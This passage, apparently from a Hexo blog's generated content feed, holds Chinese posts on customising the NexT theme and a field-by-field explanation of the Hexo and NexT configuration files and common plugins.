class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">"#mydivshow"</span>).velocity(<span class="string">'stop'</span>).velocity(&#123;<span class="attr">opacity</span>: <span class="number">1</span>&#125;);</span></span><br><span class="line"><span class="actionscript">  &#125;,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">"#mydivshow"</span>).velocity(<span class="string">'stop'</span>).velocity(&#123;<span class="attr">opacity</span>: <span class="number">0</span>&#125;);</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"mydivshow"</span> <span class="attr">class</span>=<span class="string">"mydivshow"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--my custom code end--&gt;</span></span><br></pre></td></tr></table></figure><p>然后找到代码行：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> display_toc and toc(page.content).length &gt; 1 %&#125;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--noindex--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"post-toc-wrap motion-element sidebar-panel sidebar-panel-active"</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>在此的上方添加一个，如下所示：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!--my custom code begin--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--my custom code end--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> display_toc and toc(page.content).length &gt; 1 %&#125;</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--noindex--&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"post-toc-wrap motion-element sidebar-panel sidebar-panel-active"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post-toc"</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="首页隐藏文章"><a href="#首页隐藏文章" class="headerlink" title="首页隐藏文章"></a>首页隐藏文章</h2><p>修改next主题文件夹下的layout中的index.swig文件，将</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">post_template.render(<span class="built_in">post</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>修改成:</p><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% if post.visible !=='hide' %&#125;</span><br><span class="line">    &#123;&#123; post_template.render(<span class="name">post</span>, <span class="literal">true</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>在Front-matter添加visible字段即可，当visible字段为hide时会在首页隐藏文章。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">visible:</span> hide</span><br></pre></td></tr></table></figure><h2 id="版权透明度"><a href="#版权透明度" class="headerlink" title="版权透明度"></a>版权透明度</h2><p>在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版权样式设置</span></span><br><span class="line">.post-copyright&#123;</span><br><span class="line">  background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标签透明度"><a href="#标签透明度" class="headerlink" title="标签透明度"></a>标签透明度</h2><p>在/hexo/themes/next/source/css/_custom文件夹下打开custom.styl文件，往里面添加以下代码:</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 标签样式设置</span></span><br><span class="line">.posts-expand .post-tags&#123;</span><br><span class="line">  a &#123;</span><br><span class="line">    background:rgba(<span class="number">241</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">0.1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>自己搞不定，资料查不出来的情况下，问问其他人有时候会有意想不到的效果；</li><li>CSS可以通过 <code>!important</code>来设置优先级；</li><li>nexT的样式建议不去修改源码，通过修改/hexo/themes/next/source/css/_custom/custom.styl文件即可；</li><li>根据最近的一顿操作，发现了hexo目录结构。特此记录，Ps：不建议修改源码样式，虽然我自己改了很多~~手动捂脸：</li></ol><table><thead><tr><th>路径</th><th>文件名</th><th>作用</th></tr></thead><tbody><tr><td>/hexo/themes/next/source/css/_custom</td><td>custom.styl</td><td>可用于自定义配置样式：.content、.sidebar、.header等</td></tr><tr><td>/hexo/themes/next/source/css/_common/components/highlight</td><td>highlight.styl</td><td>代码样式设置</td></tr><tr><td>/hexo/themes/next/layout</td><td>_layout.swig</td><td>主布局文件</td></tr><tr><td>/hexo/themes/next/layout</td><td>index.swig</td><td>首页布局文件</td></tr><tr><td>/hexo/themes/next/layout</td><td>···</td><td>XX布局文件</td></tr><tr><td>/hexo/themes/next/layout/partials</td><td>footer.swig</td><td>页脚布局（不确定）</td></tr><tr><td>/hexo/themes/next/layout/_custom</td><td>Null</td><td>存放自定义布局文件</td></tr><tr><td>/hexo/themes/next/layout/_macro</td><td>All</td><td>存放宏，用于博客生成</td></tr></tbody></table><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这次美化没有完全彻底，可以看到还有一部分样式怪怪的。以后有时间，慢慢优化！！CSS太难了！！！太晚了，洗洗睡咯。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog更新&amp;配置文件详解</title>
    <url>/archives/d6a90b9.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>最近博客的CSS被我玩坏了，顺带就对博客进行整体更新，并且对hexo、nexT的配置文件进行详细的记录。<br>Ps：每篇文章还弄了摘要格式！好累~~下一篇会写nexT主题的自定义优化。</p><a id="more"></a><p>由于使用hexo-neat插件压缩有问题，然后改用gulp进行压缩。发现来来回回都会有问题，并且提交到GitHub上之后，导致博客的CSS都出问题无法显示。发现nexT主题更新到6.0+，在GitHub上面的路径也换了，最终决定重新搭建博客。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>软件、环境这些可以参考博客搭建这篇文章。<br>使用hexo init本地新建一个博客之后，下载最新的next主题。</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>cd hexo</span><br><span class="line"><span class="variable">$ </span>git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/theme</span>-<span class="keyword">next</span>/hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>以前写的文章对Hexo、nexT的配置文件没有进行详细的说明，这次搭建的时候发现有点头痛！因此，这次准备把所用到的各个字段都进行记录，便于以后出现意外情况再次重建。</p><h2 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h2><p>Hexo的配置为hexo根目录下的_config.yml文件。</p><h3 id="Site配置"><a href="#Site配置" class="headerlink" title="Site配置"></a>Site配置</h3><p>用于配置站点的主要属性。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Site</span></span><br><span class="line"><span class="symbol">title:</span> <span class="meta">#站点主标题</span></span><br><span class="line"><span class="symbol">subtitle:</span> <span class="meta">#站点副标题</span></span><br><span class="line"><span class="symbol">description:</span> <span class="meta">#站点描述</span></span><br><span class="line"><span class="symbol">author:</span> <span class="meta">#站点作者</span></span><br><span class="line"><span class="symbol">language:</span> <span class="meta">#站点语言</span></span><br><span class="line"><span class="symbol">timezone:</span> <span class="meta">#站点时区</span></span><br></pre></td></tr></table></figure><h3 id="Url配置"><a href="#Url配置" class="headerlink" title="Url配置"></a>Url配置</h3><p>用于配置Url请求时的主要属性。<br>Url这块我进行了优化，安装了hexo-abbrlink插件：让文章链接唯一化。在hexo根目录下执行<code>$ npm install hexo-abbrlink --save</code></p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># URL</span><br><span class="line">## If your site is put <span class="keyword">in</span> a subdirectory, set url <span class="keyword">as</span> <span class="string">'http://yoursite.com/child'</span> and root <span class="keyword">as</span> <span class="string">'/child/'</span></span><br><span class="line">url: #站点url</span><br><span class="line">enforce_ssl: #强制使用ssl</span><br><span class="line">root: #站点目录</span><br><span class="line">permalink: archives/:abbrlink.html #站点链接设置</span><br><span class="line">abbrlink: #abbrlink设置</span><br><span class="line">  alg: crc32  # 算法：crc16(default) and crc32</span><br><span class="line">  rep: hex    # 进制：dec(default) and hex</span><br><span class="line">  ## crc16 &amp; hex</span><br><span class="line">  ##  https:<span class="comment">//iassas.com/posts/66c8.html</span></span><br><span class="line">  ## crc16 &amp; dec</span><br><span class="line">  ##  https:<span class="comment">//iassas.com/posts/65535.html</span></span><br><span class="line">  ## crc32 &amp; hex</span><br><span class="line">  ##  https:<span class="comment">//iassas.com/posts/8ddf18fb.html</span></span><br><span class="line">  ## crc32 &amp; dec</span><br><span class="line">  ##  https:<span class="comment">//iassas.com/posts/1690090958.html</span></span><br><span class="line">permalink_defaults:</span><br></pre></td></tr></table></figure><h3 id="Directory配置"><a href="#Directory配置" class="headerlink" title="Directory配置"></a>Directory配置</h3><p>用于配置站点目录的主要属性。该部分的配置不需要修改。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Directory</span></span><br><span class="line"><span class="symbol">source_dir:</span> source        <span class="meta">#资源文件夹，这个文件夹用来存放内容</span></span><br><span class="line"><span class="symbol">public_dir:</span> public        <span class="meta">#公共文件夹，这个文件夹用于存放生成的站点文件</span></span><br><span class="line"><span class="symbol">tag_dir:</span> tags             <span class="meta">#标签文件夹</span></span><br><span class="line"><span class="symbol">archive_dir:</span> archives     <span class="meta">#归档文件夹</span></span><br><span class="line"><span class="symbol">category_dir:</span> categories  <span class="meta">#分类文件夹</span></span><br><span class="line"><span class="symbol">code_dir:</span> downloads/code  <span class="meta">#Include code 文件夹</span></span><br><span class="line"><span class="symbol">i18n_dir:</span> :lang           <span class="meta">#国际化（i18n）文件夹</span></span><br><span class="line"><span class="symbol">skip_render:</span>              <span class="meta">#跳过指定文件的渲染，您可使用 glob 表达式来匹配路径</span></span><br></pre></td></tr></table></figure><h3 id="Writing配置"><a href="#Writing配置" class="headerlink" title="Writing配置"></a>Writing配置</h3><p>用于配置写作时的主要属性。该部分的配置不需要修改。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span>                <span class="comment">#新文章的文件名称</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span>                    <span class="comment">#预设布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span>                        <span class="comment">#把标题转换为 title case</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span>                     <span class="comment">#在新标签中打开链接</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>                        <span class="comment">#把文件名称转换为 (1) 小写或 (2) 大写</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>                    <span class="comment">#显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>                <span class="comment">#启动 Asset 文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>                    <span class="comment">#把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>                            <span class="comment">#显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span>                              <span class="comment">#代码块的设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br></pre></td></tr></table></figure><h3 id="Home-page配置"><a href="#Home-page配置" class="headerlink" title="Home page配置"></a>Home page配置</h3><p>用于配置主页的主要属性。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = '')</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span> <span class="comment">#主页索引</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">''</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line"></span><br><span class="line"><span class="attr">archive_generator:</span> <span class="comment">#档案索引</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">yearly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">monthly:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tag_generator:</span> <span class="comment">#标签索引</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="Category-amp-Tag配置"><a href="#Category-amp-Tag配置" class="headerlink" title="Category &amp; Tag配置"></a>Category &amp; Tag配置</h3><p>用于配置分类、标签的主要属性。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Category &amp; Tag</span></span><br><span class="line"><span class="symbol">default_category:</span> uncategorized      <span class="meta">#默认分类</span></span><br><span class="line"><span class="symbol">category_map:</span>                        <span class="meta">#分类别名</span></span><br><span class="line"><span class="symbol">tag_map:</span>                             <span class="meta">#标签别名</span></span><br></pre></td></tr></table></figure><h3 id="Date配置"><a href="#Date配置" class="headerlink" title="Date配置"></a>Date配置</h3><p>用于配置日期的主要属性。该部分的配置不需要修改。</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># Date / Time format</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format <span class="keyword">as</span> defined <span class="keyword">in</span></span><br><span class="line">## http:<span class="comment">//momentjs.com/docs/#/displaying/format/</span></span><br><span class="line">date_format: YYYY-MM-DD       #日期格式</span><br><span class="line">time_format: HH:mm:ss         #时间格式</span><br></pre></td></tr></table></figure><h3 id="Pagination配置"><a href="#Pagination配置" class="headerlink" title="Pagination配置"></a>Pagination配置</h3><p>用于配置分页的主要属性。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line">per_page: 10                   #每页显示的文章量 (0 = 关闭分页功能)</span><br><span class="line">pagination_dir:<span class="built_in"> page </span>          #分页目录</span><br></pre></td></tr></table></figure><h3 id="Extensions配置"><a href="#Extensions配置" class="headerlink" title="Extensions配置"></a>Extensions配置</h3><p>用于扩展的主要属性。<br>plugin我加了hexo-generator-feed（用来生成RSS），theme我选择用next。</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https:<span class="comment">//hexo.io/plugins/</span></span><br><span class="line">## Themes: https:<span class="comment">//hexo.io/themes/</span></span><br><span class="line">plugin: </span><br><span class="line">  - hexo-generator-feed</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure><h3 id="Deployment配置"><a href="#Deployment配置" class="headerlink" title="Deployment配置"></a>Deployment配置</h3><p>用于配置部署的主要属性。<br>我就选择部署到GitHub，还支持Heroku、Rsync、OpenShift、FTPSync等。可以参考<a href="https://hexo.io/zh-cn/docs/deployment.html" target="_blank" rel="noopener" title="官网部署说明">官网说明</a>。<br>部署到GitHub需要安装hexo-deployer-git插件，在hexo根目录下执行<code>$ npm install hexo-deployer-git --save</code>。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># Deployment</span></span><br><span class="line"><span class="meta">## Docs: https:<span class="comment">//hexo.io/docs/deployment.html</span></span></span><br><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> https:<span class="comment">//github.com/youname/youname.github.io.git</span></span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></table></figure><h3 id="search配置"><a href="#search配置" class="headerlink" title="search配置"></a>search配置</h3><p>用于配置搜索的主要属性。<br>启用搜索需要安装hexo-generator-search、hexo-generator-searchdb插件，在hexo根目录下执行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-generator-<span class="keyword">search</span> <span class="comment">--save</span></span><br><span class="line">$ npm <span class="keyword">install</span> hexo-generator-searchdb <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>安装完之后还需要在nexT主题里面进行配置。后续会说到如何配置，稳住。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure><h3 id="feed配置"><a href="#feed配置" class="headerlink" title="feed配置"></a>feed配置</h3><p>用于配置RSS。<br>RSS和ATOM的区别，可以参考<a href="http://www.cnblogs.com/yjmyzz/archive/2009/02/19/1393972.html" target="_blank" rel="noopener">这里</a>。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span>        <span class="comment">#atom/rss2</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span>    <span class="comment">#feed路径</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10</span>         <span class="comment">#最大帖子数</span></span><br><span class="line">  <span class="attr">hub:</span>           </span><br><span class="line">  <span class="attr">content:</span>          <span class="comment">#true/false 是否将整个页面包含进去</span></span><br></pre></td></tr></table></figure><h3 id="hexo-neat配置"><a href="#hexo-neat配置" class="headerlink" title="hexo-neat配置"></a>hexo-neat配置</h3><p>用于博客压缩，加快访问速度。<br>启用压缩需要安装hexo-neat，在hexo根目录下执行<code>$ npm install hexo-neat --save</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexo-neat 静态资源压缩</span></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span> </span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span> </span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'*.min.css'</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'*.min.js'</span></span><br></pre></td></tr></table></figure><h3 id="hexo-encypt配置"><a href="#hexo-encypt配置" class="headerlink" title="hexo-encypt配置"></a>hexo-encypt配置</h3><p>用于文章加密。<br>启用文章加密需要安装hexo-blog-encrypt，在hexo根目录下执行<code>$ npm install hexo-blog-encrypt --save</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章加密功能</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>启用加密功能需要在文章的Front-matter部分添加password字段即可。建议修改post.md模版，目录为hexo\scaffolds\。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">&#123;&#123;</span> <span class="string">title</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">&#123;&#123;</span> <span class="string">date</span> <span class="string">&#125;&#125;</span></span><br><span class="line"><span class="attr">tags:</span> </span><br><span class="line"><span class="attr">categories:</span> </span><br><span class="line"><span class="attr">password:</span>          <span class="comment">#文章密码</span></span><br><span class="line"><span class="attr">abstract:</span>          <span class="comment">#文章摘要</span></span><br><span class="line"><span class="attr">message:</span>           <span class="comment">#密码提示</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><h3 id="hexo-autonofollowp配置"><a href="#hexo-autonofollowp配置" class="headerlink" title="hexo-autonofollowp配置"></a>hexo-autonofollowp配置</h3><p>用于外部链接优化，主要作用：</p><ol><li>防止不可信的内容，最常见的是博客上的垃圾留言与评论中为了获取外链的垃圾链接，为了防止页面指向一些拉圾页面和站点。</li><li>付费链接：为了防止付费链接影响Google的搜索结果排名，Google建议使用nofollow属性。</li><li>引导爬虫抓取有效的页面：避免爬虫抓取一些无意义的页面，影响爬虫抓取的效率。<br>其主要方法是给所有外部链接加上rel=”external nofollow”属性，对外部链接target=”_blank”采用在新窗口种打开外部链接的方法。<br>启用该功能需要安装hexo-autonofollowp，在hexo根目录下执行<code>$ npm install hexo-autonofollowp --save</code><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 外部链接优化</span></span><br><span class="line"><span class="attr">nofollow:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">exclude:</span>     <span class="comment"># 例外的链接，可将友情链接放置此处</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">'yousite'</span></span><br></pre></td></tr></table></figure><h3 id="sitemap配置"><a href="#sitemap配置" class="headerlink" title="sitemap配置"></a>sitemap配置</h3>用于站点地图配置，主要用于SEO优化。<br>启用该功能需要安装hexo-generator-sitemap、hexo-generator-baidu-sitemap，在hexo根目录下执行<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-generator-sitemap <span class="comment">--save</span></span><br><span class="line">$ npm <span class="keyword">install</span> hexo-generator-baidu-sitemap <span class="comment">--save</span></span><br></pre></td></tr></table></figure>配置如下<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># hexo sitemap</span></span><br><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> sitemap.xml</span><br><span class="line"><span class="symbol">baidusitemap:</span></span><br><span class="line"><span class="symbol">  path:</span> baidusitemap.xml</span><br></pre></td></tr></table></figure><h3 id="symblos-count-time配置"><a href="#symblos-count-time配置" class="headerlink" title="symblos_count_time配置"></a>symblos_count_time配置</h3>用于站点字数、阅读时间统计等。<br>启用该功能需要安装hexo-symbols-count-time，在hexo根目录和next主题目录下执行<code>$ npm install hexo-symbols-count-time --save</code>。<strong><font color="red">注意这里我是两个地方都执行</font></strong>。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="live2d配置"><a href="#live2d配置" class="headerlink" title="live2d配置"></a>live2d配置</h3>用于站点’吉祥物’设置，作用应该是美化站点吧。手动/斜眼笑！<br>想要吉祥物的话需要先安装hexo-helper-live2d，在hexo根目录下执行<code>$ npm install hexo-helper-live2d --save</code>。接下来修改next主题目录的_layout.swig文件，路径为hexo\themes\next\layout\。在合适的地方给它安个家，要在body标签之间，例如<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><span class="template-variable">&#123;&#123; live2d() &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure>也可以看看喜欢什么<a href="https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md" target="_blank" rel="noopener" title="GitHub-live2d">吉祥物</a>。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">model:</span> <span class="string">z16</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="number">-30</span></span><br><span class="line">  <span class="attr">mobileShow:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobileScaling:</span> <span class="number">0.5</span></span><br></pre></td></tr></table></figure><h3 id="lazyload配置"><a href="#lazyload配置" class="headerlink" title="lazyload配置"></a>lazyload配置</h3>用于图片快速加载设置。<br>启用该功能需要安装hexo-lazyload-image，在hexo根目录在执行<code>$ npm install hexo-lazyload-image --save</code><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> </span><br><span class="line">  <span class="attr">onlypost:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">loadingImg:</span> <span class="comment"># eg. ./images/loading.png</span></span><br></pre></td></tr></table></figure><h2 id="nexT配置"><a href="#nexT配置" class="headerlink" title="nexT配置"></a>nexT配置</h2>nexT的配置文件为next目录下的_config.yml文件，路径为hexo\themes\next_config.yml。由于nexT的配置较多，就记录修改或者启用的地方。配置文件中所填写的目录路径皆为/source目录下，例如修改图标来源将参数值设置成/images/favicon.ico的话，表示来源为hexo\themes\next\source\images\favicon.ico。<h3 id="favicon设置"><a href="#favicon设置" class="headerlink" title="favicon设置"></a>favicon设置</h3>用于图标设置，效果显示在站点标签页的地方。<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">favicon:</span></span><br><span class="line"><span class="symbol">  small:</span> <span class="meta-keyword">/images/</span>favicon<span class="number">-16</span>x16-next.ico</span><br><span class="line"><span class="symbol">  medium:</span> <span class="meta-keyword">/images/</span>favicon<span class="number">-32</span>x32-next.ico</span><br><span class="line"><span class="symbol">  apple_touch_icon:</span> <span class="meta-keyword">/images/</span>apple-touch-icon-next.png</span><br><span class="line">  <span class="meta">#safari_pinned_tab: /images/logo.svg</span></span><br><span class="line">  <span class="meta">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="meta">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure><h3 id="keyword设置"><a href="#keyword设置" class="headerlink" title="keyword设置"></a>keyword设置</h3>用于关键字设置。<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">keywords:</span> <span class="string">"keyword1, keyword2, keyword3"</span></span><br></pre></td></tr></table></figure><h3 id="rss设置"><a href="#rss设置" class="headerlink" title="rss设置"></a>rss设置</h3>用于rss设置，结合hexo中的设置。<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">rss:</span> /atom.xml</span><br></pre></td></tr></table></figure><h3 id="footer设置"><a href="#footer设置" class="headerlink" title="footer设置"></a>footer设置</h3>用于页脚设置，nexT6.0可以在配置文件中设置页脚。以前用5.X的时候，需要自己手工去修改。所以及时更新很重要哦。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="comment"># Specify the date when the site was setup.</span></span><br><span class="line">  <span class="comment"># If not defined, current year will be used.</span></span><br><span class="line">  <span class="attr">since:</span> <span class="comment">#网站建立日期</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Icon between year and copyright info.</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">heart</span> <span class="comment">#年份和版权之间的图标</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If not defined, will be used `author` from Hexo main config.</span></span><br><span class="line">  <span class="attr">copyright:</span> <span class="string">Hywell</span> <span class="comment">#版权</span></span><br><span class="line">  <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">  <span class="comment"># Hexo link (Powered by Hexo).</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">theme:</span></span><br><span class="line">    <span class="comment"># Theme &amp; scheme info link (Theme - NexT.scheme).</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Version info of NexT after scheme info (vX.X.X).</span></span><br><span class="line">    <span class="attr">version:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">  <span class="comment"># Any custom text can be defined here.</span></span><br><span class="line">  <span class="attr">custom_text:</span> <span 